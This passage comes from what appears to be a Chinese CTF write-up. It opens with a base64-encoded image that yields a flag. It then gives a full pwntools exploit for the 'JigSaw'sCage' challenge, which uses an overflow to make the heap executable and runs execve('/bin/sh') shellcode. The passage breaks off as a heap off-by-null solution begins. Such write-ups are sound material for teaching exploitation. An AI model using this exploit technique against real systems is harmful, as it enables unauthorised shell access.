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
+</code></pre>
+<p>最后面的等号被转义了，应该是两个等号，直接 base64 转图片即可</p>
+<figure data-type="image" tabindex="123"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/209fcf7fecf7d.png" alt="1629872897868.png" loading="lazy"></figure>
+<p>Flag: flag{57dd74fb21bb1aee50f19421bf836f23}</p>
+<h1 id="pwn">pwn</h1>
+<h2 id="pwn3-jigsawscage">pwn3 JigSaw'sCage</h2>
+<figure data-type="image" tabindex="124"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/b49d48c81f32c.png" alt="1629873011381.png" loading="lazy"></figure>
+<p>存在溢出，改 v2 的值，触发 mprotect，使得 heap 区域可执行。</p>
+<figure data-type="image" tabindex="125"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/09818f3c30c3e.png" alt="1629873047757.png" loading="lazy"></figure>
+<p>因为有 text 功能，可以执行堆块里的指令，然后就是写汇编布置参数调用 execve(&quot;/bin/sh&quot;) 来拿 shell</p>
+<figure data-type="image" tabindex="126"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/802ac36bc0a1f.png" alt="1629873070943.png" loading="lazy"></figure>
+<pre><code class="language-python">#!/usr/bin/env python3
+#coding=utf-8
+from pwn import*
+context.log_level = 'debug'
+context.arch='amd64'
+binary = './JigSAW' 
+main_arena = 0x1beb80
+s = lambda buf: io.send(buf)
+sl = lambda buf: io.sendline(buf)
+sa = lambda delim, buf: io.sendafter(delim, buf)
+sal = lambda delim, buf: io.sendlineafter(delim, buf)
+shell = lambda: io.interactive()
+r = lambda n=None: io.recv(n)
+ra = lambda t=tube.forever:io.recvall(t)
+ru = lambda delim: io.recvuntil(delim)
+rl = lambda: io.recvline()
+rls = lambda n=2**20: io.recvlines(n)
+su = lambda buf,addr:io.success(buf+&quot;==&gt;&quot;+hex(addr))
+local =1
+if local == 1:
+    io=process(binary)
+else:
+    io=remote('47.104.71.220',10273)
+#elf=ELF(binary)
+#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
+#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+ru('Name:')
+sl('a')
+ru('Make your Choice:')
+sl('1229782937960972288')
+'''
+  puts(&quot;Make Your Choice:&quot;);
+  puts(&quot;1.Add Space&quot;);
+  puts(&quot;2.Edit Space&quot;);
+  puts(&quot;3.Delete Space&quot;);
+  puts(&quot;4.Test Space&quot;);
+  puts(&quot;5.Show Space&quot;);
+  return puts(&quot;6.Exit&quot;);
+'''
+def add(index):
+	ru('6.Exit')
+	sl('1')
+	ru(&quot;Index? : &quot;)
+	sl(str(index))
+
+def edit(index,content):
+	ru('6.Exit')
+	sl('2')
+	ru(&quot;Index? : &quot;)
+	sl(str(index))
+	ru(&quot;iNput:&quot;)
+	s(content)
+
+def free(index):
+	ru('6.Exit')
+	sl('3')
+	ru(&quot;Index? : &quot;)
+	sl(str(index))
+
+def show(index):
+	ru('6.Exit')
+	sl('5')
+	ru(&quot;Index? : &quot;)
+	sl(str(index))
+
+def test(index):
+	ru('6.Exit')
+	sl('4')
+	ru(&quot;Index? : &quot;)
+	sl(str(index))
+
+add(0)
+add(1)
+add(2)
+add(3)
+edit(0,b'/bin/sh\0')
+edit(1,asm('sub rdx,0x20;mov r13,rdx')+asm('leave;ret'))
+edit(2,asm('xor edx, edx;mov rax,0x3b;mov rdi,r13;')+asm('syscall'))#xor esi, esi
+gdb.attach(io)
+
+test(1)
+test(2)
+io.interactive()
+</code></pre>
+<p>Flag: flag{58591d4d-068f-47ed-9305-a65762917b06}</p>
+<h2 id="pwn5passwordbox_freeversion">pwn5PassWordBox_FreeVersion</h2>
+<figure data-type="image" tabindex="127"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/08/25/474ec7b0e3d9f.png" alt="1629873382071.png" loading="lazy"></figure>
+<p>2.27 版本的 offbynull，有一字长的加密，一开始没想到直接填充\X00 就可以 leak 加密的密钥，无脑爆破，写了个小程序，把密钥爆出来了。贴个源码。</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt; 
+unsigned int passwd[2];
+int main(){
